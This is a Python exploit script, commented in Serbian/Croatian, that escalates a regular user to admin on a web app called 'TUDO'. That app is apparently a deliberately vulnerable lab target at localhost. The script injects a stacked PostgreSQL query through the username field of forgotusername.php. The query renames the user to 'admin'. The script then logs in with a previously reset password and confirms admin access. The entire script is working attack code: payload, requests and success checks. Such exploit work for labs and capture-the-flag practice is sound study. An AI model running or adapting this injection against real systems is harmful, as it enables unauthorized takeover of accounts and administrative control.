#!/usr/bin/env python3
"""
Admin Privilege Escalation - TUDO
----------------------------------
Ranjivost: SQL Injection u forgotusername.php (parametar `username`)
Tehnika:   PostgreSQL stacked queries (`;`) -> UPDATE users SET username='admin'
Impact:    Regularni korisnik moze dobiti admin sesiju
"""

import requests


def _is_admin(session: requests.Session, target: str) -> bool:
    """
    Admin-only update_motd.php vraca 200 ako sesija ima $_SESSION['isadmin'].
    """
    r = session.get(target + "/admin/update_motd.php", allow_redirects=False)
    return r.status_code == 200 and "Update MoTD" in r.text


def _logout(session: requests.Session, target: str) -> None:
    session.get(target + "/includes/logout.php", allow_redirects=False)


def _sqli_rename_user_to_admin(session: requests.Session, target: str, user: str) -> bool:
    """
    forgotusername.php gradi SQL string direktnim spajanjem username parametra:
      select * from users where username='<input>';

    Payload zatvara string, dodaje UPDATE, i komentarise ostatak upita.
    """
    payload = f"'; UPDATE users SET username='admin' WHERE username='{user}' --"
    r = session.post(
        target + "/forgotusername.php",
        data={"username": payload},
        allow_redirects=False,
    )
    return r.status_code in (200, 302)


def _login_as_admin(session: requests.Session, target: str, password: str) -> bool:
    """
    Posle promene username-a, login kao `admin` sa lozinkom resetovanom u Step 1
    postavlja $_SESSION['isadmin'] jer login.php proverava samo username string.
    """
    r = session.post(
        target + "/login.php",
        data={"username": "admin", "password": password},
        allow_redirects=False,
    )
    return r.status_code == 302


def run_privesc(session: requests.Session, target: str, user: str, password: str) -> bool:
    """
    Escalates `user` to an admin session via SQLi in forgotusername.php.

    Parametri:
      session  - requests.Session
      target   - http://localhost:8000
      user     - korisnik cija je sifra resetovana u Step 1
      password - nova sifra iz Step 1

    Vraca True ako je trenutna sesija admin.
    """
    print(f"[*] Pokusavam SQLi privesc za korisnika '{user}'")

    if _is_admin(session, target):
        print("[+] Sesija je vec admin")
        return True

    _logout(session, target)

    if not _sqli_rename_user_to_admin(session, target, user):
        print("[-] POST na /forgotusername.php nije uspeo")
        return False

    if not _login_as_admin(session, target, password):
        print("[-] Login kao admin sa resetovanom sifrom nije uspeo")
        return False

    if _is_admin(session, target):
        print("[+] Uspeh! Trenutna sesija ima admin privilegije")
        return True

    print("[-] /admin/update_motd.php i dalje nije dostupan")
    return False
